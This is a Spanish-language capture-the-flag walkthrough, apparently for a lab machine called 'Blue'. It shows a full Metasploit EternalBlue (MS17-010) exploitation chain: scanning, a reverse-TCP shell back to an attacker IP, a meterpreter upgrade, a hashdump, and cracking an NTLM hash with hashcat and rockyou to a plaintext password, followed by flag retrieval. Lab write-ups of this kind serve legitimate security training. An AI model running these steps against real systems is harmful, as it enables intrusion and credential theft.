# Modulo Blue
En este modulo se explica como vulnerar un sistema comprometido con el exploit eternalblue de windows. Ocuparemos metasploit para esto.

## Fases
1. Reconocimiento
2. Explotacion
3. Crack hashes
4. Capture the flag

### 1. Reconocimiento
Utilizaremos como ip de host victima: **10.10.122.11**
Utilizaremos como ip de host atacante: **10.10.87.100**

creamos la db de metasploit

```
msfdb_init
```

en otra consola levantamos metasploit framework
```
msfconsole
```

Creamos workspace para orden
```
workspace -a blue
```
Escaneamos el objetivo
```
db_nmap 10.10.122.11
```

Centraremos nuestra atencion a los puertos que nos interesan (445)
```
db_nmap -sV --script vulners -p445 10.10.122.11
```
Veremos que es vulnerable a eternalblue
```
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
```

### 2. Explotacion

Para explotar esta vulnerabilidad debemos buscar el exploit adecuado

```
smsf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

seleccionamos el primero
```
msf6 > use 0
[*] Using configured payload windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

vemos las opciones disponibles
```
show options
```

Seteamos RHOSTS
```
set rhosts 10.10.122.11
```

Seteamos LHOSTS
```
set lhosts 10.10.87.100
```

explotamos vulnerabilidad
```
exploit
```

Luego de un rato aparecerá el shell de windows, salimos de la session con ctrl+z, verificamos la sessiones activas
```
sessions -l
```

usamos el post exploit shell_to_meterpreter para transformar la shell en un shell meterpreter
```
use post/multi/manage/shell_to_meterpreter
```

Seteamos session
```
set session 1 (numero que dio el sessions -l)
```

Corremos el post
```
run
```

Esto creará un meterpreter como session incremental (supongamos que la dejó en 2), accedemos a ella
```
sessions -i 2
```
### 3. Crack hashes

Obtenemos los hashes
```
hashdump
```

En kali, creamos el archivo hash de Jon
```
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > pwd.txt
```

Descomprimimos rockyou.txt
```
gunzip /usr/share/wordlists/rockyou.txt.gz
```

Crackeamos con hashcat
```
hashcat -m 1000 pwd.txt /usr/share/wordlists/rockyou.txt
ashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz, 2866/5796 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

ffb43f0de35be4d9917ac0cc8ad57f8d:alqfna22                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: ffb43f0de35be4d9917ac0cc8ad57f8d
Time.Started.....: Tue Aug 29 09:25:58 2023 (1 sec)
Time.Estimated...: Tue Aug 29 09:25:59 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6819.2 kH/s (0.06ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10201088/14344385 (71.12%)
Rejected.........: 0/10201088 (0.00%)
Restore.Point....: 10199040/14344385 (71.10%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: alsinah -> alphasarto11

Started: Tue Aug 29 09:25:35 2023
Stopped: Tue Aug 29 09:26:00 2023
```

password: **alqfna22**

### 4. Capture the flag

En este apartado nos centraremos en los objetivos del capture the flag


Flag1? This flag can be found at the system root. 

```
shell
cd C:\
dir
type flag1.txt
exit
```

Flag2? This flag can be found at the location where passwords are stored within Windows. (El nombre de la ruta me la dio bard.google.com)

```
shell
cd C:\Windows\System32\config\
dir
type flag2.txt
exit
```

flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 
```
shell
cd C:\Windows\Users\Jon\Desktop
dir
type flag3.txt
exit
```

Otra manera de hacerlo directamente desde meterpreter (Para obtener las rutas sin tanta busqueda, pero obvio, hay que entender el patron de las banderas)
```
search -f flag*.txt
```
---
Metalback